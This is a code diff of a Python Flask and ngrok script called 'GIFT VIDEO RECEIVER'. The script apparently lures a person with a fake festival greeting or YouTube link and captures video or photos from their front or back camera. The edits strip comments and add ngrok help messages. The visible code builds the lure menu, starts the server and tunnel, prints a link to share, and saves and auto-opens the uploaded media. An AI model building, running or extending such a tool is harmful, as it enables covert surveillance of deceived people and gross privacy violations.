@@ -62,7 +62,6 @@ def upload_media():
         media_type = request.form.get('type', 'unknown')
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
         
-        # Determine extension
         if media_type == 'photo':
             ext = 'jpg'
         else:
@@ -86,7 +85,6 @@ def upload_media():
         print(f"   📁 {filename}")
         print(f"   📊 {file_info['size']:,} bytes")
         
-        # Auto-open the file
         try:
             if sys.platform == 'linux':
                 subprocess.run(['xdg-open', filepath], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -136,7 +134,6 @@ class GiftServer:
         return True
 
     def get_camera_type(self):
-        """Get camera type from user"""
         print("\n📷 Select camera type:")
         print("  1. Front Camera")
         print("  2. Back Camera")
@@ -151,7 +148,6 @@ class GiftServer:
                 print("❌ Invalid choice. Enter 1 or 2")
 
     def get_capture_mode(self):
-        """Get capture mode from user"""
         print("\n📸 Select capture mode:")
         print("  1. Video - Record 15 second video")
         print("  2. Photo - Capture 5 photos")
@@ -166,7 +162,6 @@ class GiftServer:
                 print("❌ Invalid choice. Enter 1 or 2")
 
     def show_main_menu(self):
-        """Show main menu and get user choice"""
         print("\n" + "="*60)
         print("🎁 GIFT VIDEO RECEIVER")
         print("="*60)
@@ -238,6 +233,7 @@ class GiftServer:
         
         print("\n❌ ngrok is not installed or not in PATH!")
         print("📥 Install from: https://ngrok.com/download")
+        print("   Or use: sudo apt install ngrok (if available)")
         return False
 
     def monitor_ngrok(self):
@@ -277,6 +273,7 @@ class GiftServer:
                 return True
             else:
                 print("⚠️ ngrok started but URL not found")
+                print("📋 Check http://localhost:4040 for the URL")
                 return False
                 
         except Exception as e:
@@ -339,16 +336,12 @@ class GiftServer:
             if not self.check_ngrok():
                 return
             
-            # Step 1: Main menu (Festival or YouTube)
             mode = self.show_main_menu()
             
-            # Step 2: Camera type
             camera = self.get_camera_type()
             
-            # Step 3: Capture mode (Video or Photo)
             capture_mode, duration, photos = self.get_capture_mode()
             
-            # Step 4: Get specific details
             if mode == 'festival':
                 name = self.get_festival_name()
                 video_id = None
@@ -356,22 +349,18 @@ class GiftServer:
                 video_id = self.get_youtube_video()
                 name = None
             
-            # Start server
             self.start_flask()
             if not self.start_ngrok():
                 return
             
-            # Generate link
             link, mode_name = self.generate_link(mode, name, video_id, camera, capture_mode, duration, photos)
             
-            # Display the link
             print("\n" + "="*60)
             print(f"📤 SHARE THIS LINK ({mode_name}):")
             print("="*60)
             print(f"\n🔗 {link}")
             print("\n" + "="*60)
             
-            # Instructions
             print("\n📋 Configuration Summary:")
             print(f"   🎯 Mode: {mode_name}")
             print(f"   📷 Camera: {'Front' if camera == 'user' else 'Back'}")
